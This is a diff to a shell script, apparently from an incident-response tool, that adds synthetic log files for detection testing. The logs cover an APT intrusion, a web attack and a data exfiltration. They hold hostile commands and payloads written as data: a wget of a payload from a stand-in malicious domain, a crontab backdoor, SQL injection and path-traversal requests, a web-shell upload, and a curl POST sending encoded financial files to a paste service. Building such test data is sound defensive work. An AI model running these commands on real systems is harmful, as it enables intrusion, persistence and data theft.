@@ -103,7 +103,7 @@ generate_sample_logs() {
     local output_dir="${TEMP_DIR}/sample_logs"
     mkdir -p "$output_dir"
     
-    irf_log INFO "Generating sample log data in $output_dir"
+    irf_log INFO "Generating comprehensive sample log data in $output_dir"
     
     # Generate SSH brute force attempt logs
     cat > "${output_dir}/ssh_brute_force.log" << EOF
@@ -146,8 +146,51 @@ May 21 03:20:55	syslog	server1	WARN	root	server1		bash	5681	Command executed: ca
 May 21 03:25:10	syslog	server1	WARN	user1	server1		bash	5682	Permission denied: /etc/passwd
 EOF
     
+    # Advanced persistent threat (APT) scenario
+    cat > "${output_dir}/apt_scenario.log" << EOF
+timestamp	source_type	source_name	log_level	username	hostname	ip_address	service	process_id	message
+2023-01-01 08:15:00	auth	server1	INFO	admin	server1	185.27.134.12	sshd	1234	Accepted publickey for admin from 185.27.134.12 port 22 ssh2
+2023-01-01 08:16:20	auth	server1	INFO	admin	server1	185.27.134.12	sudo	1235	admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/find / -perm -4000 -ls
+2023-01-01 08:20:15	syslog	server1	INFO	admin	server1	185.27.134.12	bash	1236	Command executed: wget http://malicious-domain.com/payload.tgz -O /tmp/.hidden/payload.tgz
+2023-01-01 08:22:30	syslog	server1	WARN	root	server1	185.27.134.12	bash	1237	Command executed: tar -xzf /tmp/.hidden/payload.tgz -C /tmp/.hidden/
+2023-01-01 08:25:45	syslog	server1	WARN	root	server1	185.27.134.12	bash	1238	Command executed: chmod +x /tmp/.hidden/backdoor
+2023-01-01 08:26:10	syslog	server1	WARN	root	server1	185.27.134.12	crontab	1239	root edited crontab entry: @reboot /tmp/.hidden/backdoor
+2023-01-01 09:15:20	syslog	server1	WARN	root	server1	185.27.134.12	bash	1240	Command executed: find /etc/ssh -type f -name "*.pub" -exec cat {} \\;
+2023-01-01 10:30:45	syslog	server1	WARN	root	server1	185.27.134.12	bash	1241	Command executed: cat /etc/passwd > /tmp/.hidden/passwd.bak
+2023-01-01 10:35:10	syslog	server1	WARN	root	server1	185.27.134.12	bash	1242	Command executed: netstat -antup > /tmp/.hidden/netstat.bak
+2023-01-01 11:45:30	syslog	server1	WARN	root	server1	185.27.134.12	bash	1243	Command executed: nohup /tmp/.hidden/backdoor > /dev/null 2>&1 &
+EOF
+
+    # Web application attack scenario
+    cat > "${output_dir}/web_attack.log" << EOF
+timestamp	source_type	source_name	log_level	username	hostname	ip_address	service	process_id	message
+2023-01-02 14:10:00	apache	webserver	INFO		webserver	45.33.12.184	apache2	5678	192.168.1.20 - - [02/Jan/2023:14:10:00 +0000] "GET /login.php HTTP/1.1" 200 2571
+2023-01-02 14:10:05	apache	webserver	INFO		webserver	45.33.12.184	apache2	5678	192.168.1.20 - - [02/Jan/2023:14:10:05 +0000] "GET /admin.php HTTP/1.1" 302 354
+2023-01-02 14:10:20	apache	webserver	WARN		webserver	45.33.12.184	apache2	5678	192.168.1.20 - - [02/Jan/2023:14:10:20 +0000] "POST /login.php HTTP/1.1" 200 2571 "username=admin&password=admin123"
+2023-01-02 14:10:25	apache	webserver	WARN		webserver	45.33.12.184	apache2	5678	192.168.1.20 - - [02/Jan/2023:14:10:25 +0000] "POST /login.php HTTP/1.1" 200 2571 "username=admin&password=password"
+2023-01-02 14:10:30	apache	webserver	WARN		webserver	45.33.12.184	apache2	5678	192.168.1.20 - - [02/Jan/2023:14:10:30 +0000] "POST /login.php HTTP/1.1" 200 2571 "username=admin&password=' OR '1'='1"
+2023-01-02 14:10:40	apache	webserver	WARN		webserver	45.33.12.184	apache2	5678	192.168.1.20 - - [02/Jan/2023:14:10:40 +0000] "POST /login.php HTTP/1.1" 302 354 "username=admin&password=' OR '1'='1"
+2023-01-02 14:10:50	apache	webserver	WARN		webserver	45.33.12.184	apache2	5678	192.168.1.20 - - [02/Jan/2023:14:10:50 +0000] "GET /admin.php HTTP/1.1" 200 4680
+2023-01-02 14:11:05	apache	webserver	CRITICAL	webserver	45.33.12.184	apache2	5678	192.168.1.20 - - [02/Jan/2023:14:11:05 +0000] "GET /admin.php?action=list&order=1%20UNION%20SELECT%201,username,password,4,5%20FROM%20users HTTP/1.1" 200 7890
+2023-01-02 14:11:15	apache	webserver	CRITICAL	webserver	45.33.12.184	apache2	5678	192.168.1.20 - - [02/Jan/2023:14:11:15 +0000] "GET /download.php?file=../../../etc/passwd HTTP/1.1" 200 2458
+2023-01-02 14:11:30	apache	webserver	CRITICAL	webserver	45.33.12.184	apache2	5678	192.168.1.20 - - [02/Jan/2023:14:11:30 +0000] "POST /upload.php HTTP/1.1" 200 1256 "filename=shell.php"
+EOF
+
+    # Data exfiltration scenario
+    cat > "${output_dir}/data_exfil.log" << EOF
+timestamp	source_type	source_name	log_level	username	hostname	ip_address	service	process_id	message
+2023-01-03 02:15:00	auth	dataserver	INFO	analyst	dataserver	10.45.32.17	sshd	8901	Accepted password for analyst from 10.45.32.17 port 22 ssh2
+2023-01-03 02:16:10	syslog	dataserver	INFO	analyst	dataserver	10.45.32.17	bash	8902	Command executed: find /var/data -type f -name "*.xls" | grep financial
+2023-01-03 02:20:45	syslog	dataserver	WARN	analyst	dataserver	10.45.32.17	bash	8903	Command executed: cp /var/data/financial/q4_2022_results.xls /tmp/
+2023-01-03 02:22:30	syslog	dataserver	WARN	analyst	dataserver	10.45.32.17	bash	8904	Command executed: gzip -c /tmp/q4_2022_results.xls > /tmp/file.gz
+2023-01-03 02:23:15	syslog	dataserver	WARN	analyst	dataserver	10.45.32.17	bash	8905	Command executed: xxd -p /tmp/file.gz | tr -d '\\n'
+2023-01-03 02:25:30	syslog	dataserver	WARN	analyst	dataserver	10.45.32.17	bash	8906	Command executed: curl -s -X POST https://paste-service.com/api -d "data=$(cat /tmp/hex.txt)"
+2023-01-03 02:30:00	syslog	dataserver	WARN	analyst	dataserver	10.45.32.17	bash	8907	Command executed: rm -f /tmp/q4_2022_results.xls /tmp/file.gz /tmp/hex.txt
+2023-01-03 02:35:22	firewall	dataserver	WARN		dataserver	10.45.32.17	firewalld	8910	Large outbound transfer: src=10.45.32.17 dst=185.176.43.89 bytes=12458765
+EOF
+
     # Log the generated files details but don't include in function output
-    irf_log INFO "Generated sample log files:"
+    irf_log INFO "Generated comprehensive test scenarios:"
     find "$output_dir" -type f -name "*.log" | sort | while read -r log_file; do
         local count
         count=$(wc -l < "$log_file")
